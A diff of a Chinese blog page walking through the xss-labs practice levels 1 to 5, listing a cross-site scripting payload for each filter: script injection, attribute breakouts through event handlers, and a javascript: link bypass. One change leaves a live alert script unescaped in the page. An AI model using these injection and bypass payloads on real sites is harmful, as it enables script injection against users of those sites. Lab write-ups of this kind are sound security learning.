@@ -16,12 +16,12 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="xsslabs参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 level-1—–无过滤无过滤直接：&lt;script&gt;alert(123);&lt;&#x2F;script&gt; level-2——闭合标签闭">
+    <meta name="description" content="xsslabs参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 level-1—–无过滤无过滤直接：alert(&quot;&quot;我什么都不会&quot;&quot;); level-2——闭合标签闭合标签：&quot;&gt;&lt;scri">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS">
 <meta property="og:url" content="https://junske51.github.io/kele6.github.io/2024/04/15/xss/index.html">
 <meta property="og:site_name" content="可乐">
-<meta property="og:description" content="xsslabs参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 level-1—–无过滤无过滤直接：&lt;script&gt;alert(123);&lt;&#x2F;script&gt; level-2——闭合标签闭">
+<meta property="og:description" content="xsslabs参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 参考链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ytdd66&#x2F;article&#x2F;details&#x2F;136946635 level-1—–无过滤无过滤直接：alert(&quot;&quot;我什么都不会&quot;&quot;); level-2——闭合标签闭合标签：&quot;&gt;&lt;scri">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png">
@@ -48,7 +48,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/direct/ab709436b35c413e909e51e4b0c0a62d.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/direct/be82d9feca8f41d5ab6ae37fd01d6c57.png">
 <meta property="article:published_time" content="2024-04-15T06:18:20.000Z">
-<meta property="article:modified_time" content="2024-04-15T06:23:40.570Z">
+<meta property="article:modified_time" content="2024-04-15T06:38:02.761Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png">
@@ -299,10 +299,10 @@
                 
                 <h1 id="xsslabs"><a href="#xsslabs" class="headerlink" title="xsslabs"></a>xsslabs</h1><p><em>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p>
 <p><em>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p>
-<h2 id="level-1—–无过滤"><a href="#level-1—–无过滤" class="headerlink" title="level-1—–无过滤"></a>level-1—–无过滤</h2><p>无过滤直接：<code>&lt;script&gt;alert(123);&lt;/script&gt;</code></p>
-<h2 id="level-2——闭合标签"><a href="#level-2——闭合标签" class="headerlink" title="level-2——闭合标签"></a>level-2——闭合标签</h2><p>闭合标签：<code>&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;</code></p>
-<h2 id="level-3—–单引号闭合-js"><a href="#level-3—–单引号闭合-js" class="headerlink" title="level-3—–单引号闭合+js"></a>level-3—–单引号闭合+js</h2><p>单引号闭合+js：可能会对 “  &lt; &gt; 编码（即过滤）<br>可以js：’onclick&#x3D;’javascript:alert(123)’<br>‘onfocus&#x3D;’javascript:alert(123)’<br>‘onblur&#x3D;’javascript:alert(123)’                     (去掉单引号就要加&#x2F;&#x2F;或者&gt;)——–被过滤就不可了<br>后面加 &#x2F;&#x2F;  &gt; 也是可以的</p>
-<h2 id="level-4—–双引号闭合-js"><a href="#level-4—–双引号闭合-js" class="headerlink" title="level-4—–双引号闭合+js"></a>level-4—–双引号闭合+js</h2><p>双引号闭合+js：<br>“onclick&#x3D;javascript:alert(1)&#x2F;&#x2F;<br>“onclick&#x3D;’javascript:alert(1)’</p>
+<h2 id="level-1—–无过滤"><a href="#level-1—–无过滤" class="headerlink" title="level-1—–无过滤"></a>level-1—–无过滤</h2><p>无过滤直接：<script>alert(""我什么都不会"");</script></p>
+<h2 id="level-2——闭合标签"><a href="#level-2——闭合标签" class="headerlink" title="level-2——闭合标签"></a>level-2——闭合标签</h2><p>闭合标签：<code>&quot;&gt;&lt;script&gt;alert(&quot;我是菜菜&quot;);&lt;/script&gt;</code></p>
+<h2 id="level-3—–单引号闭合-js"><a href="#level-3—–单引号闭合-js" class="headerlink" title="level-3—–单引号闭合+js"></a>level-3—–单引号闭合+js</h2><p>单引号闭合+js：可能会对 “  &lt; &gt; 编码（即过滤）<br>可以js：’onclick&#x3D;’javascript:alert(“捞捞我吧”)’<br>‘onfocus&#x3D;’javascript:alert(“学不完，根本学不完”)’<br>‘onblur&#x3D;’javascript:alert(123)’                     (去掉单引号就要加&#x2F;&#x2F;或者&gt;)——–被过滤就不可了<br>后面加 &#x2F;&#x2F;  &gt; 也是可以的</p>
+<h2 id="level-4—–双引号闭合-js"><a href="#level-4—–双引号闭合-js" class="headerlink" title="level-4—–双引号闭合+js"></a>level-4—–双引号闭合+js</h2><p>双引号闭合+js：<br>“onclick&#x3D;javascript:alert(“嘎”)&#x2F;&#x2F;<br>“onclick&#x3D;’javascript:alert(”佬佬带带“)’</p>
 <h2 id="level-5-—–js伪协议"><a href="#level-5-—–js伪协议" class="headerlink" title="level-5 —–js伪协议"></a>level-5 —–js伪协议</h2><p>部分代码：</p>
 <p>$str &#x3D; strtolower($_GET[“keyword”]);<br>$str2&#x3D;str_replace(“&lt;script”,”&lt;scr_ipt”,$str);<br>$str3&#x3D;str_replace(“on”,”o_n”,$str2);</p>
 <p>js伪协议：发现script和on都被替换， 这一关我们利用<code>&lt;a&gt;</code>标签绕过进行绕过。<br>“&gt; <a href=javascript:alert(123)>xss</a></p>
